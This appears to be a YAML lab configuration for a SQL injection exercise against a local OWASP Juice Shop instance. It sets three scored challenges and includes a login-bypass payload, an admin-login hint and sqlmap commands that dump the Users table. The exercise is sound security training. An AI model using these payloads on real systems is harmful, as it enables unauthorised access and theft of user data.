instructions: |
  # SQL Injection — Fundamentals

  **Target:** OWASP Juice Shop running at `http://juice-shop:3000`

  Open Firefox and navigate to the target. You have `curl`, `sqlmap`, and Burp Suite CE
  available in the terminal.

  **Reminder:** Only attack the provided target — no external hosts.

  ### Quick reference

  Test for SQLi in login:
  ```
  Email: ' OR '1'='1
  Password: anything
  ```

  Extract data with sqlmap:
  ```bash
  sqlmap -u "http://juice-shop:3000/rest/products/search?q=test" --dbs
  ```

challenges:
  - id: auth-bypass
    title: "Authentication Bypass via SQLi"
    description: |
      Bypass the Juice Shop login form using SQL injection to log in as **any user**.

      Go to `http://juice-shop:3000/#/login` and use a classic SQLi payload in the
      email field. Once logged in, save your JWT token:

      ```bash
      # Open browser dev tools → Application → Local Storage → token
      # Or intercept with Burp Suite
      echo "YOUR_JWT_HERE" > /root/bypass_token.txt
      ```
    type: script
    points: 30
    validation_script: docs/validate_bypass.sh

  - id: admin-login
    title: "Log in as the Administrator"
    description: |
      Find the administrator's email (check the API or try common admin emails)
      and log in using SQLi. Save the admin JWT to `/root/admin_token.txt`.

      **Hint:** Try `admin@juice-sh.op` in the email field with a SQLi suffix.
    type: script
    points: 30
    validation_script: docs/validate_admin.sh

  - id: extract-users
    title: "Extract User Emails via SQLi"
    description: |
      Use sqlmap or manual SQLi to extract the list of registered users from the
      database. Save all email addresses (one per line) to `/root/users.txt`.

      ```bash
      sqlmap -u "http://juice-shop:3000/rest/products/search?q=test" \
             --tables --dump -T Users --columns email --batch
      ```
    type: script
    points: 20
    validation_script: docs/validate_extract.sh

